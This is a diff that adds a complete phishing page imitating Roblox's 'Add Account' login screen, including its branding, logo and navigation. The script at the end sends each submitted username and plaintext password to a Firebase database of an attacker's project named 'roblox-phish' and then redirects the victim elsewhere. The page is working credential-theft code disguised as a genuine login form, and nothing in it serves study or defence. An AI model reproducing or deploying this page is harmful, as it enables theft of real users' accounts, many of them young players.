@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Add Account</title>
+  <style>
+    @font-face {
+      font-family: 'Builder Sans';
+      src: url('BuilderSans-Thin-100.otf') format('opentype');
+      font-weight: 100;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: 'Builder Sans';
+      src: url('BuilderSans-Light-300.otf') format('opentype');
+      font-weight: 300;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: 'Builder Sans';
+      src: url('BuilderSans-Regular-400.otf') format('opentype');
+      font-weight: 400;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: 'Builder Sans';
+      src: url('BuilderSans-Medium-500.otf') format('opentype');
+      font-weight: 500;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: 'Builder Sans';
+      src: url('BuilderSans-SemiBold-600.otf') format('opentype');
+      font-weight: 600;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: 'Builder Sans';
+      src: url('BuilderSans-Bold-700.otf') format('opentype');
+      font-weight: 700;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: 'Builder Sans';
+      src: url('BuilderSans-ExtraBold-800.otf') format('opentype');
+      font-weight: 800;
+      font-style: normal;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    .sr-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      white-space: nowrap;
+      border: 0;
+    }
+
+    /* Header styles */
+    .rbx-header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 40px;
+      background-color: #191a1f;
+      border-bottom: 1px solid #202227;
+      z-index: 1030;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+    }
+
+    .rbx-header .navbar-brand {
+      display: flex;
+      align-items: center;
+      color: #f7f7f8;
+      text-decoration: none;
+      font-size: 20px;
+      font-weight: 700;
+      padding: 8px 12px;
+    }
+
+    .rbx-header .nav {
+      display: flex;
+      list-style: none;
+      margin: 0;
+      padding: 0;
+      gap: 20px;
+      flex: 1;
+      margin-left: 24px;
+    }
+
+    .rbx-header .nav li {
+      display: flex;
+      align-items: center;
+    }
+
+    .rbx-header .nav a {
+      color: #f7f7f8;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+      padding: 8px 12px;
+      transition: color 0.2s ease;
+    }
+
+    .rbx-header .nav a:hover {
+      color: #ffffff;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+      background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)),
+        url("image.png") center/cover no-repeat;
+      color: #f7f7f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 64px 24px 24px;
+    }
+
+    .auth-card {
+      width: 100%;
+      max-width: 420px;
+      padding: 32px 15px 28px;
+      background: #272930;
+      border-radius: 0;
+      border: 1px solid rgba(16, 18, 24, 0.65);
+      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.55);
+    }
+
+    h1 {
+      margin: 0 0 24px;
+      text-align: center;
+      font-size: 2rem;
+      font-weight: 700;
+    }
+
+    input {
+      width: 100%;
+      height: 38px;
+      padding: 5px 12px;
+      border-radius: 8px;
+      border: 1px solid rgba(208, 217, 251, .12);
+      background: rgba(208, 217, 251, .08);
+      color: #d5d7dd;
+      font-size: 16px;
+      font-weight: 400;
+      line-height: 1.4em;
+      box-shadow: none;
+      transition: border 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    input::placeholder {
+      color: #d5d7dd;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #fdfdff;
+      box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.12);
+    }
+
+    .field + .field {
+      margin-top: 12px;
+    }
+
+    .primary-btn {
+      width: 100%;
+      margin: 6px 0 12px;
+      padding: 9px;
+      border: 1px solid #d5d7dd;
+      border-radius: 8px;
+      background: transparent;
+      color: #bcbec8;
+      font-size: 16px;
+      font-weight: 500;
+      line-height: 100%;
+      cursor: pointer;
+      user-select: none;
+      text-align: center;
+      transition: background 0.2s ease, color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .primary-btn:hover {
+      background: rgba(213, 215, 221, 0.1);
+      color: #d5d7dd;
+    }
+
+    .link-row {
+      margin-top: 12px;
+      margin-bottom: 16px;
+      text-align: center;
+      font-size: 16px;
+    }
+
+    .link-row a {
+      color: #f7f7f8;
+      text-decoration: none;
+      font-weight: 300;
+      transition: color 0.2s ease;
+    }
+
+    .link-row a:hover {
+      color: #ffffff;
+      text-decoration: underline;
+    }
+
+    .divider {
+      height: 1px;
+      background: #414550;
+      margin-bottom: 16px;
+    }
+
+    .action-btn {
+      width: 100%;
+      padding: 9px;
+      border-radius: 8px;
+      border: 1px solid transparent;
+      background: rgba(208, 217, 251, .12);
+      color: #f7f7f8;
+      font-size: 16px;
+      font-weight: 500;
+      line-height: 100%;
+      cursor: pointer;
+      user-select: none;
+      text-align: center;
+      transition: background 0.2s ease;
+    }
+
+    .action-btn:first-of-type {
+      margin-top: 12px;
+      margin-bottom: 6px;
+    }
+
+    .action-btn + .action-btn {
+      margin-top: 0;
+    }
+
+    .action-btn:hover {
+      background: rgba(208, 217, 251, .18);
+    }
+
+    .subtle-link {
+      display: block;
+      margin-top: 18px;
+      margin-bottom: 0;
+      text-align: center;
+      color: #f7f7f8;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: 500;
+      transition: color 0.2s ease;
+    }
+
+    .subtle-link:hover {
+      color: #ffffff;
+      text-decoration: underline;
+    }
+
+    @media (max-width: 420px) {
+      .auth-card {
+        padding: 32px 24px 28px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header class="rbx-header">
+    <a class="navbar-brand" href="/home">
+      <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMjAiIGhlaWdodD0iNjAiIGZpbGw9Im5vbmUiIHZpZXdCb3g9IjAgMCAzMjAgNjAiPjxwYXRoIGZpbGw9IiNmZmYiIGQ9Im0zOC41OCAzOC40MDQgOS4yMSAxNi44NTlIMzAuN2wtNy43NzctMTQuNDA3aC03LjM2OHYxNC40MDdIMFY0LjE5M2gyOC40NDljMTEuNzY4IDAgMTkuMjQgNi41MzIgMTkuMjQgMTguMjc4IDAgNy41NTgtMy40OCAxMi45NzItOS4xMSAxNS45MzNNMTUuNTU1IDE3LjQ2NnYxMC4xMTJoMTEuMDUyYzMuMjc0IDAgNS4zMi0xLjk0MSA1LjMyLTUuMTA3cy0yLjA0Ni01LjAwNS01LjMyLTUuMDA1em04MS42NjMgNDEuNTcxTDUwLjY1NiA0Ni40NzQgNjMuMTQxIDBsMjMuMjggNi4yODIgMjMuMjgxIDYuMjgxek04OC40MTcgMjQuODIgNzUuNDIgMjEuMjQ1bC0zLjQ4IDEyLjk3MiAxMi45OTcgMy41NzV6bTc0LjYwMiAxNi4wMzZjMCA5LjgwNS02LjI0MiAxNC40MDctMTUuOTY0IDE0LjQwN0gxMTYuNTZWNC4xOTNoMjkuNDcyYzkuNzIxIDAgMTUuOTYzIDUuMDA1IDE1Ljk2MyAxMy43ODkgMCA1LjUxNS0yLjA0NiA5LjE5My01LjkzNSAxMS43NDcgNC40MDEgMS45MzQgNi45NTkgNS44MTYgNi45NTkgMTEuMTI3TTEzMS43MDUgMTYuNDV2Ny41NThoMTAuMTI1YzIuNzYzIDAgNC40MDEtMS4yMjYgNC40MDEtMy44ODEgMC0yLjQ1Mi0xLjYzOC0zLjY3Ny00LjQwMS0zLjY3N3ptMCAyNi41NTZoMTEuMzU5YzIuNjYxIDAgNC4yMDEtMS40MyA0LjIwMS0zLjg4MyAwLTIuNjU0LTEuNTM1LTMuODgtNC4yMDEtMy44OGgtMTEuMzU5em0zOC45ODktMzguODEzaDE1LjU1MnYzNS45NDloMjIuMzA5djE1LjEyaC0zNy44NjN6bTk1LjA2OCAyNS41MzZjMCA1LjI1Mi0xLjU2IDEwLjM4Ny00LjQ4NCAxNC43NTRhMjYuNiAyNi42IDAgMCAxLTExLjk0IDkuNzggMjYuNjYgMjYuNjYgMCAwIDEtMTUuMzczIDEuNTEyIDI2LjYyIDI2LjYyIDAgMCAxLTEzLjYyMy03LjI2OCAyNi41MjEgMjYuNTIxIDAgMCAxLTUuNzY4LTI4Ljk0YzIuMDE0LTQuODUzIDUuNDI0LTkgOS44LTExLjkxOWEyNi42NCAyNi42NCAwIDAgMSAxNC43ODItNC40NzUgMjYuNTY1IDI2LjU2NSAwIDAgMSAxOC44MjcgNy43NiAyNi41IDI2LjUgMCAwIDEgNS43NjcgOC42MjEgMjYuNCAyNi40IDAgMCAxIDIuMDEyIDEwLjE3em0tMTUuNTU0IDBjMC02LjMzNC01LjAxNS0xMS4zMzktMTEuMDUyLTExLjMzOS02LjAzOCAwLTExLjA1MyA1LjAwNS0xMS4wNTMgMTEuMzM5czUuMDE1IDExLjMzNyAxMS4wNTMgMTEuMzM3YzYuMDM3IDAgMTEuMDUyLTUuMDEgMTEuMDUyLTExLjM0M3ptNTMuMDA4LS44MThMMzIwIDU1LjI2M2gtMTguNTI4bC05LjIwNS0xNS4wMi05LjUxNyAxNS4wMmgtMTguODNsMTcuNDk5LTI1Ljc0LTE2LjA2Ni0yNS4zM2gxOC41MjJsOC40OTQgMTMuNzg5IDguMTg3LTEzLjc4OWgxOC40MnoiLz48L3N2Zz4=" alt="Roblox" height="24" />
+    </a>
+    <nav>
+      <ul class="nav">
+        <li><a href="/charts">Charts</a></li>
+        <li><a href="/catalog">Marketplace</a></li>
+        <li><a href="/develop">Create</a></li>
+      </ul>
+    </nav>
+  </header>
+  <main class="auth-card" aria-live="polite">
+    <h1>Add Account</h1>
+    <form id="authForm">
+      <div class="field">
+        <label class="sr-only" for="username">Username / Email / Phone</label>
+        <input id="username" name="username" type="text" placeholder="Username/Email/Phone" autocomplete="username" required />
+      </div>
+      <div class="field">
+        <label class="sr-only" for="password">Password</label>
+        <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required />
+      </div>
+      <button type="submit" class="primary-btn">Log In</button>
+    </form>
+    <div class="link-row">
+      <a href="#">Forgot Password or Username?</a>
+    </div>
+    <div class="divider" aria-hidden="true"></div>
+    <button class="action-btn" type="button">Email Me a One-Time Code</button>
+    <button class="action-btn" type="button">Use Another Device</button>
+    <a class="subtle-link" href="#">Create a New Account</a>
+  </main>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDvX3h0OADwniqZZO5qTk8zQe4oCbzYYh0",
+      authDomain: "roblox-phish-8bfb5.firebaseapp.com",
+      projectId: "roblox-phish-8bfb5",
+      storageBucket: "roblox-phish-8bfb5.firebasestorage.app",
+      messagingSenderId: "253864987198",
+      appId: "1:253864987198:web:a97cb6e668db28ff399f6f"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const form = document.getElementById("authForm");
+    const usernameInput = document.getElementById("username");
+    const passwordInput = document.getElementById("password");
+
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault();
+
+      const payload = {
+        username: usernameInput.value.trim(),
+        password: passwordInput.value,
+        createdAt: serverTimestamp()
+      };
+
+      try {
+        await addDoc(collection(db, "credentialSubmissions"), payload);
+        form.reset();
+        window.location.href = "https://example.com";
+      } catch (error) {
+        console.error("Failed to save credentials", error);
+        alert("Unable to store credentials right now.");
+      }
+    });
+  </script>
+</body>
+</html>
